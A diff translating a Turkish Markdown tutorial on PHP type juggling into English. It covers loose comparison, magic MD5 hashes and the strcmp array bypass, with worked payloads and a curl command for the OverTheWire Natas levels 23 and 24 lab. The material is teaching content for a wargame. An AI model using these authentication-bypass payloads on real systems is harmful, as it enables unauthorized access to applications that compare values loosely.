@@ -1,24 +1,24 @@
-# 🌐 Web Güvenliği — PHP Type Juggling
+# 🌐 Web Security — PHP Type Juggling
 
-> PHP bazen iki farklı türdeki değeri karşılaştırırken
-> sana sürpriz yapacak sonuçlar üretir.
+> PHP sometimes produces surprising results
+> when comparing two values of different types.
 
 ---
 
-## 📋 İçindekiler
+## 📋 Table of Contents
 
-- [PHP Tip Sistemi](#php-tip-sistemi)
-- [== vs === Farkı](#-vs--farkı)
-- [Tehlikeli Karşılaştırmalar](#tehlikeli-karşılaştırmalar)
-- [Magic Hash Zafiyeti](#magic-hash-zafiyeti)
+- [PHP Type System](#php-type-system)
+- [The Difference Between == and ===](#the-difference-between--and-)
+- [Dangerous Comparisons](#dangerous-comparisons)
+- [Magic Hash Vulnerability](#magic-hash-vulnerability)
 - [strcmp() Bypass](#strcmp-bypass)
-- [Natas'ta Kullanım](#natasta-kullanım)
+- [Usage in Natas](#usage-in-natas)
 
 ---
 
-## PHP Tip Sistemi
+## PHP Type System
 
-PHP **dinamik tipli** bir dildir — değişkenin tipini sen belirtmezsin, PHP otomatik belirler. Ve iki değeri karşılaştırırken gerekirse tipleri dönüştürür.
+PHP is a **dynamically typed** language — you don't specify a variable's type; PHP determines it automatically. And when comparing two values, it converts the types if necessary.
 
 ```php
 $a = "42";      // string
@@ -30,53 +30,53 @@ $e = "42abc";   // string
 
 ---
 
-## == vs === Farkı
+## The Difference Between == and ===
 
-### == (Loose Comparison — Gevşek Karşılaştırma)
+### == (Loose Comparison)
 
-Karşılaştırmadan önce değerleri **aynı tipe dönüştürür**, sonra karşılaştırır.
+Before comparing, it **converts the values to the same type**, then compares.
 
 ```php
-0   == "a"      // true  ← "a" integer'a dönüşür → 0
-0   == ""       // true  ← "" integer'a dönüşür → 0
+0   == "a"      // true  ← "a" converts to integer → 0
+0   == ""       // true  ← "" converts to integer → 0
 0   == "0"      // true
 1   == "1"      // true
 1   == "1abc"   // true  ← "1abc" → 1
 100 == "1e2"    // true  ← "1e2" scientific notation → 100
 ```
 
-### === (Strict Comparison — Katı Karşılaştırma)
+### === (Strict Comparison)
 
-Hem **değeri** hem **tipini** karşılaştırır. Tip dönüşümü yapmaz.
+Compares both the **value** and the **type**. It does not perform type conversion.
 
 ```php
-0   === "a"     // false ← farklı tip
+0   === "a"     // false ← different type
 0   === 0       // true
-"1" === 1       // false ← farklı tip
-"0" === false   // false ← farklı tip
+"1" === 1       // false ← different type
+"0" === false   // false ← different type
 ```
 
-### Karşılaştırma Tablosu (PHP 7)
+### Comparison Table (PHP 7)
 
 ```php
-// == ile tehlikeli eşitlikler
+// Dangerous equalities with ==
 "0"    == false   // true
 "0"    == null    // false
 ""     == false   // true
 ""     == null    // true
 null   == false   // true
-"php"  == 0       // true  ← string sayıya dönüşür → 0
+"php"  == 0       // true  ← string converts to a number → 0
 "1"    == true    // true
 "0"    == false   // true
 ```
 
-> ⚠️ **Not:** PHP 8'de `0 == "a"` artık `false` döner. PHP 7 ve öncesinde `true`'dur. Natas'ta PHP 7 davranışı geçerlidir.
+> ⚠️ **Note:** In PHP 8, `0 == "a"` now returns `false`. In PHP 7 and earlier it's `true`. In Natas, the PHP 7 behavior applies.
 
 ---
 
-## Tehlikeli Karşılaştırmalar
+## Dangerous Comparisons
 
-### 1. Integer ile String Karşılaştırması
+### 1. Integer with String Comparison
 
 ```php
 $input = $_GET['answer'];   // "0"
@@ -85,54 +85,54 @@ if($input == 0) {           // "0" == 0 → true!
     echo "Correct!";
 }
 
-// Ama beklenen: sadece 0 sayısı doğru
-// Saldırgan "abc" gönderebilir: "abc" == 0 → true (PHP 7)
+// But what's expected: only the number 0 is correct
+// The attacker can send "abc": "abc" == 0 → true (PHP 7)
 ```
 
-### 2. Boolean Karşılaştırması
+### 2. Boolean Comparison
 
 ```php
 if($result == true) { ... }
-// $result = "false" (string) → true! (boş olmayan string her zaman true)
-// $result = "0" → false (tek istisnalardan biri)
+// $result = "false" (string) → true! (any non-empty string is always true)
+// $result = "0" → false (one of the few exceptions)
 ```
 
-### 3. NULL Karşılaştırması
+### 3. NULL Comparison
 
 ```php
 if($secret == NULL) {
-    // Reddedilmeli
+    // Should be rejected
 }
-// Girdi: "0" → "0" == NULL → false ✓
-// Girdi: "" → "" == NULL → true ← bypass!
-// Girdi: [] → [] == NULL → false
+// Input: "0" → "0" == NULL → false ✓
+// Input: "" → "" == NULL → true ← bypass!
+// Input: [] → [] == NULL → false
 ```
 
 ---
 
-## Magic Hash Zafiyeti
+## Magic Hash Vulnerability
 
-PHP'de MD5 veya SHA1 hash'leri `==` ile karşılaştırılırken özel bir durum oluşur.
+In PHP, a special situation arises when MD5 or SHA1 hashes are compared with `==`.
 
-### 0e ile Başlayan Hash'ler
+### Hashes Starting with 0e
 
-`0e...` formatındaki string'ler PHP tarafından **scientific notation** (bilimsel gösterim) olarak yorumlanır:
+Strings in the `0e...` format are interpreted by PHP as **scientific notation**:
 
 ```
 0e1234 = 0 × 10^1234 = 0
 ```
 
-Yani iki farklı `0e...` hash'i `==` ile karşılaştırıldığında `0 == 0` olur:
+So when two different `0e...` hashes are compared with `==`, it becomes `0 == 0`:
 
 ```php
 md5("240610708")  // "0e462097431906509019562988736854"
 md5("QNKCDZO")    // "0e830400451993494058024219903391"
 
 md5("240610708") == md5("QNKCDZO")   // true!
-// Çünkü: "0e46..." == "0e83..." → 0 == 0 → true
+// Because: "0e46..." == "0e83..." → 0 == 0 → true
 ```
 
-### Bilinen Magic Hash Değerleri
+### Known Magic Hash Values
 
 | String | MD5 Hash |
 |--------|----------|
@@ -145,7 +145,7 @@ md5("240610708") == md5("QNKCDZO")   // true!
 // Bypass:
 $input = "240610708";
 if(md5($input) == "0e462097431906509019562988736854") {
-    // == ile karşılaştırılıyor → magic hash → bypass!
+    // compared with == → magic hash → bypass!
     echo "Correct!";
 }
 ```
@@ -154,22 +154,22 @@ if(md5($input) == "0e462097431906509019562988736854") {
 
 ## strcmp() Bypass
 
-`strcmp($a, $b)` fonksiyonu:
-- `$a < $b` ise negatif döner
-- `$a == $b` ise 0 döner
-- `$a > $b` ise pozitif döner
+The `strcmp($a, $b)` function:
+- returns negative if `$a < $b`
+- returns 0 if `$a == $b`
+- returns positive if `$a > $b`
 
-Güvenlik kontrolü genellikle şöyle yapılır:
+A security check is usually done like this:
 
 ```php
 if(strcmp($_POST['password'], $secret) == 0) {
-    // şifre doğru
+    // password is correct
 }
 ```
 
-### Array ile Bypass
+### Bypass with an Array
 
-PHP'de `strcmp()` ile bir array karşılaştırılırsa `NULL` döner:
+In PHP, if an array is compared with `strcmp()`, it returns `NULL`:
 
 ```php
 strcmp([], "string")   // NULL
@@ -177,19 +177,19 @@ NULL == 0              // true!
 ```
 
 ```
-POST: password[]=herhangi_bir_şey
+POST: password[]=anything
 
-strcmp(["herhangi"], $secret) → NULL
-NULL == 0 → true → giriş başarılı!
+strcmp(["anything"], $secret) → NULL
+NULL == 0 → true → login successful!
 ```
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 23 — Strstr + Integer Karşılaştırması
+### Natas 23 — Strstr + Integer Comparison
 
-**Kaynak kod:**
+**Source code:**
 
 ```php
 <?php
@@ -204,19 +204,19 @@ if(array_key_exists("passwd", $_REQUEST)){
 ?>
 ```
 
-**Koşullar:**
-1. `passwd` içinde `"iloveyou"` geçmeli
-2. `passwd` sayısal olarak `10`'dan büyük olmalı
+**Conditions:**
+1. `passwd` must contain `"iloveyou"`
+2. `passwd` must be numerically greater than `10`
 
-**Analiz:**
+**Analysis:**
 
-`$_REQUEST["passwd"] > 10` → PHP string'i integer'a dönüştürür:
+`$_REQUEST["passwd"] > 10` → PHP converts the string to an integer:
 
 ```php
 "11iloveyou" > 10   // "11iloveyou" → 11 → 11 > 10 → true!
 ```
 
-String'in başındaki sayıya bakılır.
+The number at the start of the string is what's looked at.
 
 **Payload:**
 
@@ -233,7 +233,7 @@ strstr("11iloveyou", "iloveyou") → "iloveyou" → truthy ✓
 
 ### Natas 24 — strcmp Array Bypass
 
-**Kaynak kod:**
+**Source code:**
 
 ```php
 <?php
@@ -247,48 +247,48 @@ if(array_key_exists("passwd", $_REQUEST)){
 ?>
 ```
 
-`!strcmp(...)` → strcmp 0 döndürürse giriş başarılı.
+`!strcmp(...)` → if strcmp returns 0, login is successful.
 
 **Payload:**
 
 ```
-passwd[]=herhangi
+passwd[]=anything
 ```
 
-URL'de: `?passwd[]=x` veya form'da `passwd[]` olarak gönder.
+In the URL: `?passwd[]=x` or send it as `passwd[]` in the form.
 
 ```php
 strcmp(["x"], $secret)   // NULL
-!NULL → !0 → true → giriş başarılı!
+!NULL → !0 → true → login successful!
 ```
 
 ```bash
-curl -u natas24:[şifre] \
+curl -u natas24:[password] \
      "http://natas24.natas.labs.overthewire.org/?passwd[]="
 ```
 
 ---
 
-### PHP Type Juggling — Kontrol Listesi
+### PHP Type Juggling — Checklist
 
 ```
-Kaynak kodda ara:
-  ☐ == operatörü (=== yerine)
-  ☐ strcmp() ile == 0 karşılaştırması
-  ☐ md5/sha1 hash'leri == ile karşılaştırma
-  ☐ strstr/strpos ile birleşik koşullar
+Search the source code for:
+  ☐ The == operator (instead of ===)
+  ☐ strcmp() with == 0 comparison
+  ☐ md5/sha1 hash comparison with ==
+  ☐ Combined conditions with strstr/strpos
 
-Dene:
-  ☐ Integer ile string karışımı: "10abc", "0e123"
-  ☐ Array parametresi: param[]=değer
-  ☐ Magic hash değerleri (0e ile başlayanlar)
-  ☐ Boş string: param=
-  ☐ NULL: param değerini gönderme
+Try:
+  ☐ Mix of integer and string: "10abc", "0e123"
+  ☐ Array parameter: param[]=value
+  ☐ Magic hash values (those starting with 0e)
+  ☐ Empty string: param=
+  ☐ NULL: don't send the param value
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [PortSwigger — PHP Type Juggling](https://portswigger.net/web-security/logic-flaws)
 - [PHP Type Comparison Tables](https://www.php.net/manual/en/types.comparisons.php)
@@ -297,7 +297,7 @@ Dene:
 
 ---
 
-**Önceki konu:** [16_http_redirect_bypass.md](./16_http_redirect_bypass.md)
-**Sonraki konu:** [18_php_object_injection.md](./18_php_object_injection.md)
+**Previous topic:** [16_http_redirect_bypass.md](./16_http_redirect_bypass.md)
+**Next topic:** [18_php_object_injection.md](./18_php_object_injection.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
